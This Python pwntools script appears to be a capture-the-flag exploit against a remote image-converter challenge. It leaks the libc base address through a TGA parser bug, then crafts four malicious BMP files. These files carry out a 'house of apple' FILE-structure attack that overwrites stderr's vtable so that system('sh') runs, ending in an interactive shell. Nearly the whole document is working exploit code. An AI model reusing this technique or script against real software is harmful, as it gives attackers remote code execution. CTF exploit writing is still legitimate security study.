from pwn import *
# context.log_level = 'debug'
r = remote('chall.pwnable.hk', 20010)

# r = process('./chall')
# gdb.attach(r, 'b input-bmp.c:665\nc 3\np temp')

# ====

# utils
def verify_hash(prefix, answer, difficulty):
    h = hashlib.sha256()
    h.update((prefix + answer).encode())
    bits = ''.join(bin(i)[2:].zfill(8) for i in h.digest())
    return bits.startswith('0' * difficulty)

def solve_pow(prefix, difficulty):
    i = 0
    while not verify_hash(prefix, str(i), difficulty):
        i += 1
    return str(i)

def get_file_format(file_name):
    return file_name.split('.')[-1]

def extract_address_from_svg(leak):
    leaks = leak.decode().split('style="fill:#')
    return leaks[1][:6]+leaks[2][:6]

# functions
def convert(r, file_name, to_format, end = 0):
    file_format = get_file_format(file_name)
    r.sendline(file_format)
    r.sendline(to_format)
    with open(file_name, 'rb') as f:
        file_content = f.read()
        r.sendline(str(len(file_content)))
        r.send(file_content)
    result = r.recvuntil(b'continue?')[:-9]
    # log.info(result)
    if end == 0:
        r.sendline('y')
    else:
        r.sendline('n')
        
    return result

def craft_exploit_bmp_file(libc_base, lib_top):
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
    
    def calc_h(target, lib_top, w):
        # solve h given (3*w*h) / 0x1000 *0x1000 +0x1000 - 0x10 + target - lib_top = 4*w*(h-1) 
        return (((target - lib_top) >> 12 << 12) + ((target - lib_top - 0x10 + 8) % 0x1000) // 4 + 0x1000 ) // w0
    
    def address_to_bitmap_data(addr):
        return p64(addr)[2::-1] + p64(addr)[5:2:-1] + b'\x00\x00\x00\x00'

    # Perform attack 4 times by crafting 4 bmp files

    # overwrite0
    target0 = libc_base + libc.symbols['_IO_2_1_stderr_'] - 8 # forged _wide_vtable address
    w0 = 2
    h0 = calc_h(target0, lib_top, w0)
    system_addr = libc_base+libc.symbols['system']

    # overwrite1
    target1 = libc_base + libc.symbols['_IO_2_1_stdin_'] + - 0x120 # _IO_wide_data_2._wide_vtable
    w1 = 2
    h1 = calc_h(target1, lib_top, w1)
    forged_wide_vtable_addr = target0 - 0x68

    # overwrite2
    target2 = libc_base + libc.symbols['_IO_2_1_stderr_'] # stderr
    w2 = 2
    h2 = calc_h(target2, lib_top, w2)

    # overwrite3
    target3 = libc_base + libc.symbols['_IO_2_1_stderr_'] + 216 # _IO_2_1_stderr_.vtable
    w3 = 2
    h3 = calc_h(target3, lib_top, w3)
    forged_vtable_addr = libc_base+libc.symbols['_IO_wfile_jumps'] - 0x48 # forged vtable address
    
    with open('./payload/overwrite.template', 'rb') as template_file:
        template = template_file.read()
        overwrite0_content = template[:0x12] + p32(w0) + p32(h0) + template[0x12:] + address_to_bitmap_data(system_addr)
        overwrite1_content = template[:0x12] + p32(w1) + p32(h1) + template[0x12:] + address_to_bitmap_data(forged_wide_vtable_addr)
        overwrite2_content = template[:0x12] + p32(w2) + p32(h2) + template[0x12:] + address_to_bitmap_data(u64(b'  sh\x00\x00\x00\x00'))
        overwrite3_content = template[:0x12] + p32(w3) + p32(h3) + template[0x12:] + address_to_bitmap_data(forged_vtable_addr)
        with open('./payload/overwrite0.bmp', 'wb') as fow0:
            fow0.write(overwrite0_content)
        with open('./payload/overwrite1.bmp', 'wb') as fow1:
            fow1.write(overwrite1_content)
        with open('./payload/overwrite2.bmp', 'wb') as fow2:
            fow2.write(overwrite2_content)
        with open('./payload/overwrite3.bmp', 'wb') as fow3:
            fow3.write(overwrite3_content)

# ====
r.recvuntil(b'sha256(')
prefix = r.recvuntil(b' + ')[:-3]
answer = solve_pow(prefix.decode(), 22)
r.sendline(answer)

# leak libs info by tga parser bug
leak = convert(r, './payload/leak0.tga', 'svg')
libc_info = '00'+extract_address_from_svg(leak)
libc_base = int.from_bytes(bytes.fromhex(libc_info), byteorder='little')-0x21a200
print("libc base: %s" % hex(libc_base))

# leak = convert(r, './payload/leak1.tga', 'svg')
# top_lib_info = '00'+extract_address_from_svg(leak)
# top_lib_addr = int.from_bytes(bytes.fromhex(top_lib_info), byteorder='little')-0x74100-0x4bf000-0x100
top_lib_addr = libc_base - 0x62a1000
print("top lib: %s" % hex(top_lib_addr))

# perform "house of apple" by bmp parser bug
craft_exploit_bmp_file(libc_base, top_lib_addr)
convert(r, './payload/overwrite0.bmp', 'svg')
convert(r, './payload/overwrite1.bmp', 'svg')
convert(r, './payload/overwrite2.bmp', 'svg')
convert(r, './payload/overwrite3.bmp', 'svg', 1)

r.interactive()